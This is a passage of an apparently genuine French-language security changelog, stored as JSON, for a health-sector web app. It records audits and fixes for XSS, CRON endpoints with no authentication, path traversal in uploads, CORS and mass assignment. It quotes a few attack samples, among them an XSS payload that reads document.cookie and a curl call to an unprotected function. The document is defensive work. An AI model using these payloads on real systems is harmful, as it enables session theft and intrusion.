      { "code": "DOC", "txt": "BILAN SÉCURITÉ APRÈS 0.57.35 : (1) Cleanup logout complet : localStorage aveho:* + SW DATA_CACHE/PAGE_CACHE + Supabase IndexedDB (via signOut). (2) Devices partagés safe : user B ne peut plus voir search-history, cart, dashboard config, caches photos, réponses API patients de user A. (3) 18 LINT anti-régression critiques actifs (vs 17 en 0.57.34). (4) Tests Vitest : 3169 verts. (5) Routes API : 17/19 protégées + 9/9 POST + 5/5 GET + 12/12 anti-leak + 4/4 PUT/DELETE + 3/3 OCR + 2/2 Storage. (6) 11 Edge Functions Supabase sécurisées. (7) Headers HTTP 10/10. (8) RLS Supabase 100%. (9) 9 pages admin AdminGuard + XSS toast realtime fixé. (10) Tous les bugs majeurs identifiés sont fixés" }
    ],
    "themes": ["securite", "logout", "localStorage", "service-worker"],
    "date": "3 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.35.html",
    "sqlFile": null
  },
  {
    "v": "0.57.34",
    "kind": "version",
    "titre": "🛡️ AdminGuard sur 9 pages admin + escape XSS toast realtime (user A → user B) + fix prerender SSG",
    "chantiers": [
      { "code": "SEC", "txt": "🚨 AUDIT PAGES ADMIN — Les 9 pages app/admin/* (avis-google, bulletins-archive, doublons-forces, mail-diagnostic, medecins-prescripteurs, prescriptions-archive, referentiels-sante, rpps-diagnostic, rpps-dump) n'avaient AUCUN check de rôle côté client ! Le RLS Postgres protège les données sensibles, mais conséquences pour un user non-admin qui accède aux URL : (1) UI cassée croyant à un bug. (2) Découverte de la structure interne (noms tables, schémas via les erreurs). (3) Erreurs 401/403 confuses au lieu d'un blocage clair. Risque medium" },
      { "code": "SEC", "txt": "COMPOSANT AdminGuard créé (app/components/AdminGuard.js, 130 lignes). Vérifie via 4 checks defense-in-depth : auth.can('gerer_roles') OU auth.can('manage_collectivite') OU auth.role.systeme === 'admin' OU auth.role.nom === 'Administrateur'. Attend auth.ready avant de juger (évite faux négatifs au reload). Affiche message clair 'Accès restreint' avec boutons 'Retour accueil' + 'Mon profil' si non admin. Wrap children sinon",
        "code_snippet": {
          "file": "app/components/AdminGuard.js + 9 pages admin",
          "note": "Composant + wrapping auto via script Python",
          "lang": "jsx",
          "before": "// AVANT 0.57.34 - pages admin sans check de rôle\n\"use client\";\nexport default function AvisGooglePage() {\n  // ... tout le code admin direct\n  // ↑↑↑↑↑↑↑↑↑↑↑↑\n  // N'importe quel user authentifié peut accéder à l'URL\n  // /admin/avis-google et voir l'UI (les données BDD sont\n  // protégées par RLS mais l'UI elle-même est exposée)\n}",
          "after": "// 0.57.34 - AdminGuard restreint l'accès\n\"use client\";\nimport AdminGuard from \"../../components/AdminGuard\";\n\nfunction AvisGooglePageInner() {\n  // ... tout le code admin (inchangé)\n}\n\n// Wrapper qui vérifie le rôle avant de rendre les enfants\nexport default function AvisGooglePage() {\n  return (\n    <AdminGuard>\n      <AvisGooglePageInner />\n    </AdminGuard>\n  );\n}\n\n// Si user non-admin :\n//   → Affiche \"Accès restreint - réservée aux administrateurs\"\n//   → Bouton retour vers /accueil + bouton vers /profil\n//   → Pas de fuite de la structure interne"
        }
      },
      { "code": "SEC", "txt": "🚨 XSS TROUVÉ DANS TOAST REALTIME — lib/useRealtimeTable.js faisait toast.innerHTML = `...${title}...${message}...`. Les variables title et message peuvent venir d'événements realtime (changements en BDD par d'autres users via Supabase Realtime). Scénario d'attaque : user A crée une intervention avec titre `<img src=x onerror=alert(document.cookie)>` → user B reçoit un toast realtime qui exécute le JS dans le contexte de son onglet authentifié. Pouvait être utilisé pour voler la session Bearer Supabase. CVSS estimé : 6.5 MEDIUM (exploit nécessite Realtime activé + 2 users connectés)" },
      { "code": "FIX", "txt": "FIX XSS toast realtime : 3 helpers ajoutés dans lib/useRealtimeTable.js : (a) escapeHtml() — escape &<>\"' standard. (b) safeIconClass() — whitelist regex ^ti-[a-z0-9-]+$ pour les icônes Tabler (empêche injection de class CSS malicieuse). (c) safeColor() — whitelist hex #abc ou #abcdef (empêche injection CSS). Les 4 inputs (title, message, icon, color) passent par les helpers AVANT injection dans innerHTML",
        "code_snippet": {
          "file": "lib/useRealtimeTable.js",
          "note": "3 helpers de sanitization",
          "lang": "js",
          "before": "// AVANT 0.57.34 - XSS via realtime\ntoast.innerHTML = `\n  <div>\n    <i class=\"ti ${icon}\" style=\"color: ${color};\"></i>\n    <div style=\"color: ${color};\">${title}</div>\n    <div>${message}</div>\n  </div>\n`;\n// ↑↑↑ Si title vient de la BDD : <img src=x onerror=alert(1)>\n//     → XSS exécuté chez tous les users connectés en realtime",
          "after": "// 0.57.34 - sanitization avant injection\nfunction escapeHtml(s) {\n  return String(s ?? \"\")\n    .replace(/&/g, \"&amp;\").replace(/</g, \"&lt;\")\n    .replace(/>/g, \"&gt;\").replace(/\"/g, \"&quot;\")\n    .replace(/'/g, \"&#39;\");\n}\n\nfunction safeIconClass(icon) {\n  if (typeof icon !== \"string\") return \"ti-bell\";\n  if (!/^ti-[a-z0-9-]{1,40}$/.test(icon)) return \"ti-bell\";\n  return icon;\n}\n\nfunction safeColor(color) {\n  if (typeof color !== \"string\") return \"#185FA5\";\n  if (!/^#[0-9a-fA-F]{3,6}$/.test(color)) return \"#185FA5\";\n  return color;\n}\n\n// Sanitize TOUS les inputs avant innerHTML\nconst safeTitle = escapeHtml(title);\nconst safeMessage = escapeHtml(message);\nconst safeIcon = safeIconClass(icon);\nconst safeColorVal = safeColor(color);\n\ntoast.innerHTML = `\n  <div>\n    <i class=\"ti ${safeIcon}\" style=\"color: ${safeColorVal};\"></i>\n    <div style=\"color: ${safeColorVal};\">${safeTitle}</div>\n    <div>${safeMessage}</div>\n  </div>\n`;"
        }
      },
      { "code": "SEC", "txt": "DEFENSE-IN-DEPTH lib/pdfPreview.js : la fonction openPdfPreview({ titre, html }) injectait titre direct dans innerHTML. En pratique appelé avec des constantes, mais si demain du contenu BDD/user transite par cette fonction, c'est XSS. Fix : escapeHtml(titre) avant l'injection" },
      { "code": "FIX", "txt": "FIX BUILD VERCEL — Erreur 'Export encountered an error on /statistiques-interventions/page' lors du prerender SSG. La page utilisait createClient() au top-level mais Next.js essayait quand même de pré-rendre la page au build (sans env vars Supabase). Fix : export const dynamic = 'force-dynamic' sur app/statistiques-interventions/page.js → désactive le SSG, rend la page à chaque request. Build Vercel + local OK maintenant" },
      { "code": "FIX", "txt": "FIX TEST v055-15-sql-modal — Le pattern regex acceptait UNIQUEMENT 'aveho-PATCH-vers-X.Y.Z.sql' mais ne reconnaissait pas les nouveaux scripts combinés 'aveho-supabase-securite-COMPLET-X.Y.Z.sql'. Élargissement du regex pour accepter les deux patterns" },
      { "code": "AI", "txt": "LINT ANTI-RÉGRESSION CRITIQUE (17e LINT actif) : 'Aucune page /admin/* n'expose son contenu sans AdminGuard'. Scan toutes les pages sous app/admin/. Si un futur dev crée une nouvelle page admin sans wrapper avec AdminGuard → le test fail avant le push" },
      { "code": "AI", "txt": "+35 tests Vitest (v057-34-admin-guard-xss-toast.test.js) : version + SW (2), AdminGuard composant (6 — fichier existe + use client + 4 checks role + auth.ready + message accès restreint + bouton retour), 9 pages admin × 2 vérifs = 18 (import + wrap), useRealtimeTable escape (5 — escapeHtml + safeIconClass + safeColor + 4 sanitize + innerHTML utilise safe), pdfPreview escape (2 — escapeHtml + safeTitre), fix prerender (1), LINT anti-régression (1). Total 3150 verts (+35)" },
      { "code": "DOC", "txt": "BILAN SÉCURITÉ APRÈS 0.57.34 : (1) 9 pages admin protégées avec AdminGuard (NEW). (2) XSS toast realtime fixé (NEW). (3) pdfPreview defense-in-depth (NEW). (4) Build Vercel fix (NEW). (5) 17 LINT anti-régression critiques actifs (vs 16 en 0.57.33). (6) Tests Vitest : 3150 verts. (7) Routes API : 17/19 protégées + 9/9 POST + 5/5 GET + 12/12 anti-leak + 4/4 PUT/DELETE + 3/3 OCR + 2/2 Storage. (8) 11 Edge Functions Supabase TOUTES sécurisées. (9) Headers HTTP 10/10. (10) RLS Supabase 100%. (11) Tous les bugs majeurs identifiés sont fixés (SSRF, IDOR, biométrie, mass-assign, cross-tenant, CRON auth, XSS toast, pages admin)" }
    ],
    "themes": ["securite", "admin", "xss"],
    "date": "3 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.34.html",
    "sqlFile": null
  },
  {
    "v": "0.57.33",
    "kind": "version",
    "titre": "🚨 Audit + sécurisation des 7 CRON Edge Functions (CRON_SECRET) + script SQL Supabase complet 0.57.33",
    "chantiers": [
      { "code": "SEC", "txt": "🚨 AUDIT CRON EDGE FUNCTIONS — 7 fonctions appelées par scheduled cron Supabase auditées : auto-archive-consents, maintenance-daily-cron, send-digest, send-renouvellement-rappels, sync-google-reviews, weekly-stats-digest, welcome-user. TOUTES VULNÉRABLES : CORS '*' + aucune vérification d'auth. Un attaquant connaissant l'URL pouvait les déclencher à volonté → DoS via génération massive d'opérations BDD, spam emails/push au nom d'Aveho, consommation quota Google Places (sync-google-reviews), archivage forcé de consentements (auto-archive-consents), phishing 'Bienvenue chez Aveho' (welcome-user). Le commentaire dans le code disait 'appeler avec Bearer SERVICE_ROLE_KEY' mais aucun check côté serveur ! CVSS estimé : 7.5 HIGH (DoS + integrity + spam reputational)" },
      { "code": "FIX", "txt": "HELPER requireCronSecret(req) ajouté dans _shared/auth.ts (60 lignes). Lit le header x-cron-secret de la requête et le compare au secret défini en env CRON_SECRET (à configurer dans Supabase Vault). Comparaison constant-time (anti timing-attacks). Retourne 500 fail-secure si CRON_SECRET non configuré (refus par défaut). Retourne 401 si secret manquant ou invalide",
        "code_snippet": {
          "file": "supabase/functions/_shared/auth.ts",
          "note": "Nouveau helper requireCronSecret",
          "lang": "ts",
          "before": "// AVANT 0.57.33 - aucune vérification\nDeno.serve(async (req) => {\n  if (req.method === \"OPTIONS\") return new Response(\"ok\", { headers: corsHeaders });\n  \n  const admin = createClient(\n    Deno.env.get(\"SUPABASE_URL\")!,\n    Deno.env.get(\"SUPABASE_SERVICE_ROLE_KEY\")!\n  );\n\n  // ↑↑↑↑↑↑↑↑↑↑↑↑↑\n  // N'IMPORTE QUI peut appeler cette fonction :\n  // curl https://&lt;projet&gt;.functions.supabase.co/auto-archive-consents -X POST\n  // → archivage de tous les consentements expirés, sans aucune authentification\n});",
          "after": "// 0.57.33 - helper requireCronSecret\nexport function requireCronSecret(req: Request): Response | null {\n  const expected = Deno.env.get(\"CRON_SECRET\");\n\n  if (!expected) {\n    // Fail-secure : si pas de secret configuré, on refuse tout\n    return new Response(\n      JSON.stringify({ error: \"CRON_SECRET non configuré\" }),\n      { status: 500, headers: { ... } }\n    );\n  }\n\n  const provided = req.headers.get(\"x-cron-secret\") || \"\";\n\n  // Comparaison constant-time (anti timing-attacks)\n  if (provided.length !== expected.length) {\n    return new Response(\n      JSON.stringify({ error: \"CRON secret invalide\" }),\n      { status: 401, headers: { ... } }\n    );\n  }\n  let mismatch = 0;\n  for (let i = 0; i < provided.length; i++) {\n    mismatch |= provided.charCodeAt(i) ^ expected.charCodeAt(i);\n  }\n  if (mismatch !== 0) {\n    return new Response(...);  // 401\n  }\n\n  return null;  // OK, secret correct\n}\n\n// Usage dans chaque CRON Function :\nDeno.serve(async (req) => {\n  const cronCheck = requireCronSecret(req);\n  if (cronCheck) return cronCheck;\n  // ... safe : l'attaquant ne peut pas appeler la fonction\n});"
        }
      },
      { "code": "SEC", "txt": "6 CRON FUNCTIONS SÉCURISÉES avec requireCronSecret : auto-archive-consents (archivage mensuel des consentements expirés), maintenance-daily-cron (génération DI, maintenances, push quotidiens), send-digest (mode dual : CRON_SECRET pour scheduled + requireAuth pour tests admin depuis /profil), send-renouvellement-rappels (rappels expiration consentement), sync-google-reviews (mode dual : CRON_SECRET pour scheduled + requireAuth pour admin UI), weekly-stats-digest (digest hebdo lundis matin). welcome-user : requireAuth (pas CRON car appelée par client après inscription)" },
      { "code": "SQL", "txt": "SCRIPT SQL SUPABASE COMPLET 0.57.33 — scripts/aveho-supabase-securite-COMPLET-0.57.33.sql. Combine en 1 fichier : (PARTIE A) RLS sur caisses_assurance_maladie + mutuelles (read authenticated + write admin only). (PARTIE B) Vues v_equipe_structure + v_admins_structure avec security_invoker = true (filtre auto par structure du caller). (PARTIE C) 3 colonnes tracking sur membres_structure : invitation_mail_envoyee_at, invitation_mail_statut (enum), invitation_mail_dernier_log. (PARTIE D NOUVEAU 0.57.33) Reconfiguration des 6 cron jobs Supabase avec le header x-cron-secret dans le POST HTTP. (PARTIE E) Bloc DO plpgsql avec RAISE NOTICE qui affiche '✓ OK' ou '✗ FAIL' sur 9 critères de vérification finale" },
      { "code": "DOC", "txt": "ACTION REQUISE CÔTÉ SUPABASE pour activer 0.57.33 : (1) Générer un secret aléatoire long : openssl rand -hex 32 → ex 'a8f5c9e2...'. (2) Supabase Dashboard → Edge Functions → Secrets → Add new secret : Name=CRON_SECRET, Value=&lt;secret généré&gt;. (3) Éditer scripts/aveho-supabase-securite-COMPLET-0.57.33.sql et remplacer 'TON_CRON_SECRET_ICI' par la même valeur + 'VOTRE_PROJET' + service_role_key. (4) Exécuter le script dans Supabase SQL Editor. (5) Redéployer les 7 Edge Functions modifiées : supabase functions deploy _shared && supabase functions deploy auto-archive-consents && ... etc. Le bloc DO plpgsql final affiche 9 ✓ OK si tout est OK" },
      { "code": "AI", "txt": "LINT ANTI-RÉGRESSION CRITIQUE (16e LINT actif) : 'Toutes les CRON Edge Functions importent requireCronSecret + aucune n'a CORS *'. Scan supabase/functions/{auto-archive-consents, maintenance-daily-cron, send-digest, send-renouvellement-rappels, weekly-stats-digest}/index.ts. Si un futur dev crée une nouvelle CRON sans CRON_SECRET → fail" },
      { "code": "AI", "txt": "+39 tests Vitest (v057-33-cron-secret-edge-functions.test.js) : version + SW (2), requireCronSecret helper (6 — export + lit env + lit header + 500 fail-secure + 401 invalid + constant-time), 6 CRON Functions × 3 vérifs = 18 (import + CORS clean + appel requireCronSecret), welcome-user requireAuth (2), sync-google-reviews dual mode (2), script SQL complet (6 — fichier existe + PARTIE A/B/C/D/E + idempotent), LINT anti-régression (2). Total 3115 verts (+39)" },
      { "code": "DOC", "txt": "BILAN SÉCURITÉ APRÈS 0.57.33 : (1) 7 CRON Edge Functions sécurisées (NEW). (2) Script SQL Supabase complet livré avec reconfig des 6 cron jobs (NEW). (3) 16 LINT anti-régression critiques actifs (vs 15 en 0.57.32). (4) Routes API : 17/19 protégées + 9/9 POST + 5/5 GET + 12/12 anti-leak + 4/4 PUT/DELETE + 3/3 OCR MIME + 2/2 Storage. (5) 11 Edge Functions Supabase TOUTES sécurisées (4 client-callable + 6 CRON + 1 welcome). (6) Headers HTTP 10/10. (7) RLS Supabase 100%. (8) Tous les bugs majeurs identifiés sont fixés (SSRF, IDOR, biométrie, mass-assign, cross-tenant, CRON auth)" }
    ],
    "themes": ["securite", "edge-functions", "cron", "supabase"],
    "date": "3 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.33.html",
    "sqlFile": "aveho-supabase-securite-COMPLET-0.57.33.sql"
  },
  {
    "v": "0.57.32",
    "kind": "version",
    "titre": "🔒 Durcissement Storage uploads : validation UUID (anti path-traversal) + whitelist MIME + taille max 10 MB sur bulletins + prescriptions",
    "chantiers": [
      { "code": "SEC", "txt": "AUDIT STORAGE UPLOADS — 3 helpers d'upload Supabase Storage auditées : (a) app/ConsentementRGPD.js (signature RGPD) ✅ déjà safe : blob généré côté client, image/png hardcodé, structure_id depuis contexte auth. (b) lib/bulletinsStorage.js ⚠ PROBLÈMES : pas de check taille fichier, pas de whitelist MIME, structureId/patientId acceptés tels quels (defense-in-depth manquante). (c) lib/prescriptionsStorage.js ⚠ mêmes problèmes. Les structureId/patientId viennent du contexte auth (pas user-controlled direct), donc pas d'exploit immédiat, mais c'est une defense-in-depth essentielle pour éviter le path-traversal si demain un nouveau caller mal codé arrive" },
      { "code": "FIX", "txt": "DURCISSEMENT lib/bulletinsStorage.js + lib/prescriptionsStorage.js (3 protections cumulées) : (1) MAX_FILE_SIZE = 10 MB → anti-DoS + protection facturation Supabase Storage (les buckets sont facturés au volume). (2) ALLOWED_MIMES = ['image/jpeg', 'image/png', 'image/webp', 'image/gif', 'application/pdf'] → empêche d'uploader HTML/JS/exécutables (qui seraient ensuite servis via signed URL — XSS potentiel). (3) UUID_RE strict pour structure_id / patient_id / prescription_id → empêche path-traversal via segments du path Storage",
        "code_snippet": {
          "file": "lib/bulletinsStorage.js + prescriptionsStorage.js",
          "note": "3 protections defense-in-depth ajoutées",
          "lang": "js",
          "before": "// AVANT 0.57.32 — pas de validation defense-in-depth\nexport function buildPath(structureId, patientId, originalFilename) {\n  const ts = Date.now();\n  const safe = sanitizeFilename(originalFilename);\n  return `${structureId}/${patientId}/${ts}-${safe}`;\n  //       ↑↑↑↑↑↑↑↑↑↑↑↑\n  // Si demain structureId = \"../other-structure\", path traversé\n}\n\nexport async function uploadBulletin(supabase, file, { structureId, patientId }) {\n  if (!file) return { error: \"Fichier manquant\" };\n  // ↑ pas de check taille → DoS possible\n  // ↑ pas de check MIME → upload HTML/JS qui sera servi via signed URL\n\n  const path = buildPath(structureId, patientId, file.name);\n  const { error } = await supabase.storage.from(BUCKET).upload(path, file, {\n    contentType: file.type || \"application/octet-stream\",\n    cacheControl: \"3600\",\n    upsert: false,\n  });\n  // ...\n}",
          "after": "// 0.57.32 — defense-in-depth complète\nconst MAX_FILE_SIZE = 10 * 1024 * 1024;  // 10 MB\nconst ALLOWED_MIMES = [\n  \"image/jpeg\", \"image/png\", \"image/webp\", \"image/gif\", \"application/pdf\"\n];\nconst UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;\n\nfunction isValidUuid(id) {\n  return typeof id === \"string\" && UUID_RE.test(id);\n}\n\nexport function buildPath(structureId, patientId, originalFilename) {\n  // ✅ Validation UUID stricte (anti path-traversal)\n  if (!isValidUuid(structureId)) {\n    throw new Error(\"structureId invalide (UUID requis)\");\n  }\n  if (!isValidUuid(patientId)) {\n    throw new Error(\"patientId invalide (UUID requis)\");\n  }\n  const ts = Date.now();\n  const safe = sanitizeFilename(originalFilename);\n  return `${structureId}/${patientId}/${ts}-${safe}`;\n}\n\nexport async function uploadBulletin(supabase, file, { structureId, patientId }) {\n  if (!file) return { error: \"Fichier manquant\" };\n  if (!structureId || !patientId) return { error: \"structureId et patientId requis\" };\n\n  // ✅ Validation UUID stricte (defense-in-depth)\n  if (!isValidUuid(structureId)) return { error: \"structureId invalide (UUID requis)\" };\n  if (!isValidUuid(patientId)) return { error: \"patientId invalide (UUID requis)\" };\n\n  // ✅ Limite taille (anti-DoS + protection facturation)\n  if (file.size > MAX_FILE_SIZE) {\n    return { error: `Fichier trop volumineux (max ${MAX_FILE_SIZE / 1024 / 1024} MB)` };\n  }\n\n  // ✅ Whitelist MIME (empêche upload HTML/JS/exécutables)\n  const mime = file.type || \"application/octet-stream\";\n  if (!ALLOWED_MIMES.includes(mime)) {\n    return { error: `Type de fichier non supporté : ${mime}` };\n  }\n\n  // ... safe upload\n}"
        }
      },
      { "code": "AI", "txt": "LINT ANTI-RÉGRESSION CRITIQUE (15e LINT actif) : 'Tous les helpers Storage ont MAX_FILE_SIZE + ALLOWED_MIMES + validation UUID dans buildPath'. Scan tous les fichiers lib/*Storage.js. Si un futur helper Storage est créé sans ces 3 protections, le test fail. Garantit la cohérence du pattern de défense" },
      { "code": "AI", "txt": "+21 tests Vitest (v057-32-storage-uploads-hardening.test.js) : version + SW sync (2), bulletinsStorage durcissement (9 — MAX_FILE_SIZE + ALLOWED_MIMES + UUID_RE + isValidUuid + buildPath throw + uploadBulletin validates), prescriptionsStorage durcissement (4 — MAX_FILE_SIZE + ALLOWED_MIMES + 3 UUIDs + upload validates), LINT anti-régression (3), audit logger redaction (3 — SENSITIVE_KEYS auth/RGPD/médical + URL_SENSITIVE_PATTERNS + Logger exports). Total 3076 verts" },
      { "code": "DOC", "txt": "BILAN SÉCURITÉ APRÈS 0.57.32 : (1) 2 Storage helpers durcis : UUID strict + 10 MB max + MIME whitelist (NEW). (2) Audit logger : SENSITIVE_KEYS étendue (auth + RGPD + médical + pro), URL patterns (Bearer/JWT/token URL) masqués. (3) 15 LINT anti-régression critiques actifs (vs 14 en 0.57.31). (4) Routes API : 17/19 protégées + 9/9 POST validation + 5/5 GET searchParams + 12/12 anti-leak + 4/4 PUT/DELETE anti-mass-assignment + 3/3 OCR MIME whitelist + 2/2 Storage helpers durcis. (5) 4 Edge Functions Supabase auth + check structure. (6) Headers HTTP 10/10. (7) RLS Supabase 100%. (8) Cross-tenant attack fixée" }
    ],
    "themes": ["securite", "storage", "uploads"],
    "date": "3 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.32.html",
    "sqlFile": null
  },
  {
    "v": "0.57.31",
    "kind": "version",
    "titre": "🛡️ Audit + durcissement Edge Functions Supabase : auth obligatoire sur send-email + send-webhook + send-push + invite-user + CORS restrictif + MIME whitelist OCR generic",
    "chantiers": [
      { "code": "SEC", "txt": "🚨 AUDIT EDGE FUNCTIONS SUPABASE — 11 fonctions Deno auditées. Trouvé 4 fonctions appelables par le client avec problèmes critiques : (a) CORS Access-Control-Allow-Origin: '*' → appelables depuis n'importe quel site malveillant. (b) Pas de check auth → un attaquant pouvait potentiellement les appeler. (c) Pas de check membership structure_id → un user authentifié de la structure A pouvait envoyer emails/push/webhooks ciblant la structure B (broadcast à tous les membres autre structure, spam des channels Teams/Slack des concurrents). Scénario d'attaque : user malveillant authentifié sur Aveho appelle send-email avec structure_id de la concurrence + body_html='<h1>Vos data sont compromises, cliquez ici</h1>' → notre serveur Resend envoie l'email officiellement signé Aveho à tous les membres de la concurrence. CVSS estimé : 7.5 HIGH" },
      { "code": "SEC", "txt": "HELPER COMMUN supabase/functions/_shared/auth.ts créé (180 lignes). Exporte : (a) isAllowedOrigin(origin) — whitelist stricte des origins Aveho (aveho-ec-app.vercel.app, aveho.fr, localhost dev, regex previews Vercel). (b) buildCorsHeaders(req) — construit dynamiquement les headers CORS selon l'origin de la requête, header Vary: Origin pour la correctness des caches CDN. (c) requireAuth(req) — vérifie Bearer token Supabase, retourne user authentifié + client admin. (d) requireStructureMembership — vérifie format UUID + query membres_structure. Retourne 403 si non membre. (e) authAndCheckStructure(req, structureId) — helper combiné (auth + check membership en 1 appel)",
        "code_snippet": {
          "file": "supabase/functions/_shared/auth.ts",
          "note": "Helper centralisé pour Edge Functions",
          "lang": "ts",
          "before": "// AVANT 0.57.31 - CORS \"*\" + pas de check structure dans Edge Function\nconst corsHeaders = {\n  \"Access-Control-Allow-Origin\": \"*\",\n  \"Access-Control-Allow-Headers\": \"authorization, x-client-info, apikey, content-type\",\n};\n\nDeno.serve(async (req) => {\n  if (req.method === \"OPTIONS\") return new Response(\"ok\", { headers: corsHeaders });\n\n  const { structure_id, target_user_id, ...rest } = await req.json();\n  // ↑↑↑↑↑↑↑↑↑↑↑↑\n  // Le serveur fait confiance aveuglément au structure_id\n  // → un user de la structure A peut cibler la structure B\n\n  const admin = createClient(...service_role_key...);\n  // ... envoie email/push/webhook à structure_id\n});",
          "after": "// 0.57.31 - CORS restrictif + auth + check membership\nimport { buildCorsHeaders, authAndCheckStructure } from \"../_shared/auth.ts\";\n\nDeno.serve(async (req) => {\n  const corsHeaders = buildCorsHeaders(req);\n  // ↑ retourne empty Allow-Origin si origin non whitelistée\n  //   → le navigateur bloque la réponse côté client\n\n  if (req.method === \"OPTIONS\") {\n    return new Response(\"ok\", { status: 204, headers: corsHeaders });\n  }\n\n  const { structure_id, ...rest } = await req.json();\n\n  // 0.57.31 : vérifie que le caller authentifié est BIEN membre\n  // de structure_id qu'il cible (anti-cross-tenant attack)\n  const authResult = await authAndCheckStructure(req, structure_id);\n  if (authResult.errorResponse) return authResult.errorResponse;\n  const admin = authResult.admin!;\n\n  // ... safe : seuls les membres de structure_id\n  //     peuvent envoyer emails/push/webhooks à cette structure\n});"
        }
      },
      { "code": "SEC", "txt": "4 EDGE FUNCTIONS SÉCURISÉES : (a) send-email — broadcast d'emails (DI, signalement, achats). Risque avant fix : phishing massif au nom d'Aveho via notre serveur Resend. (b) send-webhook — notifications Teams/Slack — Risque : spam des channels des concurrents. (c) send-push — notifications push VAPID — Risque : push à tous les members autre structure. (d) invite-user — emails d'invitation utilisateur — Risque : vector phishing massif (attaquant peut envoyer 'Inscrivez-vous chez Aveho' avec inviteLink malveillant). Pour invite-user uniquement : pas de check structure_id car le check droits/admin est fait côté Next.js avant appel. Juste requireAuth + CORS restrictif. Whitelist crons (auto-archive-consents, maintenance-daily-cron, weekly-stats-digest, send-renouvellement-rappels, send-digest, sync-google-reviews, welcome-user) : appelées par Supabase scheduled, pas par client, donc pas concernées par ce fix" },
      { "code": "SEC", "txt": "🚨 BUG TROUVÉ DANS OCR GENERIC : la route app/api/ocr/generic/route.js (OCR pour documents génériques) n'avait PAS de whitelist MIME. Le media_type fourni dans le body était envoyé direct à Claude API. Bien que Claude rejette les MIMEs inconnus, c'est une defense-in-depth qui manquait (les 2 autres routes prescription + bulletin-situation l'avaient depuis 0.57.26). Fix : ALLOWED_MIMES = ['image/jpeg', 'image/png', 'image/webp', 'image/gif', 'application/pdf'] + return 400 si MIME non whitelisté",
        "code_snippet": {
          "file": "app/api/ocr/generic/route.js",
          "note": "MIME whitelist défense en profondeur",
          "lang": "js",
          "before": "// AVANT 0.57.31 - pas de whitelist MIME\nif (!media_type) media_type = \"image/jpeg\";\nconst isPdf = media_type === \"application/pdf\";\n// ... media_type passé direct à Claude API",
          "after": "// 0.57.31 - whitelist stricte (cohérent avec les 2 autres routes OCR)\nif (!media_type) media_type = \"image/jpeg\";\n\nconst ALLOWED_MIMES = [\n  \"image/jpeg\", \"image/png\", \"image/webp\", \"image/gif\", \"application/pdf\"\n];\nif (!ALLOWED_MIMES.includes(media_type)) {\n  return Response.json(\n    { ok: false, error: `Type MIME non supporté : ${media_type}` },\n    { status: 400 }\n  );\n}\nconst isPdf = media_type === \"application/pdf\";"
        }
      },
      { "code": "AI", "txt": "2 LINT ANTI-RÉGRESSION CRITIQUES (13e + 14e LINT) : (1) 'Edge Functions appelables par le client ont CORS restrictif' — scan toutes les fonctions sous supabase/functions/ (sauf whitelist crons). Détecte le pattern dangereux 'Access-Control-Allow-Origin: \"*\"' (en code, pas dans les commentaires explicatifs). (2) 'Edge Functions appelables par le client utilisent _shared/auth.ts' — garantit qu'aucune Edge Function callable client n'oublie d'importer le helper d'auth. Si un futur dev crée une nouvelle Edge Function sans CORS restrictif ou sans auth → le test fail" },
      { "code": "AI", "txt": "+32 tests Vitest (v057-31-edge-functions-mime-ocr.test.js) : version + SW sync (2), _shared/auth.ts (9 — exports + whitelist origins + regex previews + Vary header + Bearer check + UUID validation + query membres_structure + 403 if non membre), send-email auth + structure check (4), send-webhook (3 — import + CORS clean + auth avant queries), send-push (3), invite-user (3 — auth avant traitement body), OCR generic MIME whitelist (3), 2 LINT anti-régression (2). Tests anciens v056-11 mis à jour pour le nouveau pattern (CORS via _shared/auth.ts)" },
      { "code": "DOC", "txt": "BILAN SÉCURITÉ APRÈS 0.57.31 : (1) Edge Functions Supabase auditées + 4 critiques sécurisées (NEW). (2) MIME OCR generic whitelist (NEW). (3) 14 LINT anti-régression critiques actifs (vs 12 en 0.57.30). (4) Routes API : 17/19 protégées + 9/9 POST validation + 5/5 GET searchParams + 12/12 anti-leak + 4/4 PUT/DELETE anti-mass-assignment + 3/3 OCR MIME whitelist. (5) Headers HTTP 10/10. (6) CSP + report-uri. (7) HSTS preload 1 an. (8) RLS Supabase 100%. (9) SW cleanup logout. (10) Bearer token jamais leak cross-origin. (11) Cross-tenant attack via Edge Functions fixée (NEW)" }
    ],
    "themes": ["securite", "edge-functions", "supabase"],
    "date": "3 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.31.html",
    "sqlFile": null
  },
  {
    "v": "0.57.30",
    "kind": "version",
    "titre": "🔒 Sécurisation fetchWithAuth (anti-leak Bearer URL externes) + Anti-mass-assignment PUT/DELETE caisses+mutuelles",
    "chantiers": [
      { "code": "SEC", "txt": "🚨 VULNÉRABILITÉ POTENTIELLE : lib/fetchWithAuth.js envoyait le Bearer Supabase à TOUTE URL passée en paramètre, y compris URLs externes. Fix : fonction isSameOrigin(url) qui n'envoie le Bearer QUE si URL relative /api/... ou same-origin que window.location. Sinon warning loggé." },
      { "code": "SEC", "txt": "🚨 VULNÉRABILITÉ MASS-ASSIGNMENT : routes PUT caisses et mutuelles utilisaient `const { id, ...rest } = body; updates = { ...rest }` → un attaquant pouvait modifier structure_id, created_at, etc. Fix : whitelist explicite ALLOWED_UPDATE_FIELDS + validate() avec types stricts." },
      { "code": "SEC", "txt": "4 routes sécurisées : PUT caisses (11 champs whitelist), DELETE caisses (UUID strict), PUT mutuelles (9 champs whitelist sans structure_id), DELETE mutuelles (UUID strict). requireAuth déplacé AVANT validation sur les 4." },
      { "code": "AI", "txt": "LINT anti-régression critique (12e LINT) : 'Aucune route PUT n'utilise ...rest direct vers .update()'. +20 tests Vitest." }
    ],
    "themes": ["securite", "mass-assignment", "fetch-auth"],
    "date": "3 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.30.html",
    "sqlFile": null
  },
  {
    "v": "0.57.29",
    "kind": "version",
    "titre": "🔍 Triple audit sécurité (SW + dangerouslySetInnerHTML + env) + 2 fixes : cleanup cache au logout + retrait NEXT_PUBLIC_GOOGLE_PLACES_KEY exposable",
    "chantiers": [
